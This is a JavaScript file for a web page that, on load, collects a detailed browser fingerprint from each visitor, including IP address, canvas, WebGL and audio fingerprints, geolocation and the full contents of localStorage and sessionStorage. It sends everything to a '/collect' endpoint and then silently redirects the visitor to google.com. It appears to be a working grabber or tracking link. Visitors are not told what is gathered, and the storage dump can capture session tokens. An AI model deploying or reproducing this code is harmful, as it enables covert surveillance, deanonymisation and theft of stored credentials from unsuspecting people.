// Function to collect browser fingerprint
async function getFingerprint() {
    const fingerprint = {
        ip: await getIp(), // Using an external service to get the IP
        referrer: document.referrer,
        currentUrl: window.location.href,
        userAgent: navigator.userAgent,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        languages: navigator.languages,
        colorDepth: screen.colorDepth,
        deviceMemory: navigator.deviceMemory || "N/A",
        hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
        screenResolution: [screen.width, screen.height],
        timezoneOffset: new Date().getTimezoneOffset(),
        plugins: Array.from(navigator.plugins).map(p => p.name),
        canvasFingerprint: await getCanvasFingerprint(),
        webglFingerprint: getWebGLFingerprint(),
        renderer: getWebGLFingerprint().renderer,
        audioFingerprint: await getAudioFingerprint(),
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        screenOrientation: screen.orientation.type,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack,
        battery: await getBatteryStatus(),
        networkInfo: getNetworkInfo(),
        geolocation: await getGeolocation(),
        localStorage: getStorageData(localStorage),
        sessionStorage: getStorageData(sessionStorage),
    };

    console.log(fingerprint);

    // Send the fingerprint data to your server
    try {
        await fetch('/collect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(fingerprint)
        });
    } catch (error) {
        console.error('Error sending fingerprint data:', error);
    }

    // Redirect to the client website
    window.location.href = 'http://google.com';
}

async function getIp() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

function getCanvasFingerprint() {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Browser Fingerprint', 2, 2);
        resolve(canvas.toDataURL());
    });
}

function getWebGLFingerprint() {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    return {vendor, renderer};
}

async function getAudioFingerprint() {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    oscillator.type = 'triangle';
    oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
    const analyser = audioContext.createAnalyser();
    oscillator.connect(analyser);
    analyser.connect(audioContext.destination);
    oscillator.start(0);
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    oscillator.stop();
    return data.slice(0, 10);  // Simplified fingerprint
}

async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
            level: battery.level,
            charging: battery.charging,
        };
    }
    return "N/A";
}

function getNetworkInfo() {
    if ('connection' in navigator) {
        const connection = navigator.connection;
        return {
            downlink: connection.downlink,
            effectiveType: connection.effectiveType,
        };
    }
    return "N/A";
}

function getGeolocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(position => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                });
            }, () => {
                resolve("N/A");
            });
        } else {
            resolve("N/A");
        }
    });
}

function getStorageData(storage) {
    const data = {};
    for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        data[key] = storage.getItem(key);
    }
    return data;
}

window.onload = getFingerprint;
